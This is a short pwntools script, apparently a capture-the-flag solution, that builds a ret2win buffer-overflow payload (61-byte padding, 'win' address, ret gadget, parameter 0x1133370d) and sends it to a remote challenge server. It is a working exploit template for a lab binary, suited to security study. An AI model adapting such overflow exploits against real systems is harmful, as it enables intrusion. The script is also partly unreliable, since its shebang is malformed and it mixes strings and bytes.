#!/usr/bin/env/python3
from pwn import *

elf = ELF("./casino", checksec=False)
rop = ROP(elf)

'''
Step 1. Crash the binary to prove it is has a buffer overflow vulnerability
'''


'''
Step 2. Find the offset at which we override the EIP
'''


'''
Step 3. Find the address of win function and prepare the function parameter
'''

win_addr = p32(elf.symbols['win'])
ret_addr = p32(rop.find_gadget(['ret'])[0])
param_value = p32(0x1133370d)

'''
Step 4. Run the program with the final payload
'''
payload = "A" * 61 + win_addr + ret_addr + param_value
p = remote('isc2021.root.sx', 10013)
p.sendline(payload)
p.interactive()

with open('payload.txt', 'wb') as f:
       f.write(payload)